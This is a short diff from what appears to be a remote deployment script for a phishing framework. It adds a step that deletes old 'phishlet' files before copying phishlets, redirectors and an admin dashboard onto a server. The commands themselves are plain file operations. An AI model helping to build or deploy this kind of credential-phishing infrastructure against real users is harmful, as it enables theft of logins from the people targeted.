@@ -611,9 +611,11 @@ EOFLIC`);
             }
             await log('info', '✅ Binary built successfully');
             
-            // Copy phishlets, redirectors, and admin dashboard
-            await log('info', '📁 Copying phishlets, admin dashboard, and configuration...');
+            // Copy phishlets, redirectors, and admin dashboard (clean first to remove old files)
+            await log('info', '📁 Cleaning and copying phishlets, admin dashboard, and configuration...');
             await this.executeCommand(conn, `
+                # Clean old phishlets and copy new ones
+                sudo rm -f ${installPath}/phishlets/*.yaml 2>/dev/null || true
                 sudo cp -r ${srcPath}/phishlets/* ${installPath}/phishlets/ 2>/dev/null || true
                 sudo cp -r ${srcPath}/redirectors/* ${installPath}/redirectors/ 2>/dev/null || true
                 
